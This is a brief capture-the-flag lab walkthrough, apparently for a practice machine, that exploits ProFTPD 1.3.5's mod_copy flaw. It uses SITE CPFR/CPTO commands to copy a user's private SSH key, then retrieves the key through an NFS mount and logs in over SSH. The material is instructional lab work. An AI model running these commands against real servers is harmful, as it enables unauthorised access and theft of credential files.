# Task 3 - Gain Initial Access with ProFTPD

## 🎯 Objective
Exploit ProFTPD and gain SSH access.

## 🔍 Identify FTP Version

```bash
nc 10.65.159.55 21
```

## 📌 Version Found
- ProFTPD **1.3.5**

## 🔎 Exploit Search

```bash
searchsploit ProFTPD 1.3.5
```

## 💣 Exploit Execution (mod_copy)

```bash
nc 10.65.159.55 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

## 📁 Mount NFS Share

```bash
mkdir /mnt/kenobiNFS
mount 10.65.159.55:/var /mnt/kenobiNFS
```

## 📥 Retrieve SSH Key

```bash
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
```

## 🔐 SSH Login

```bash
ssh -i id_rsa kenobi@10.65.159.55
```

## 📄 User Flag

```bash
cat /home/kenobi/user.txt
```

## 🧠 Notes
- FTP allowed unauthenticated file copying via mod_copy
- SSH key reuse enabled user access
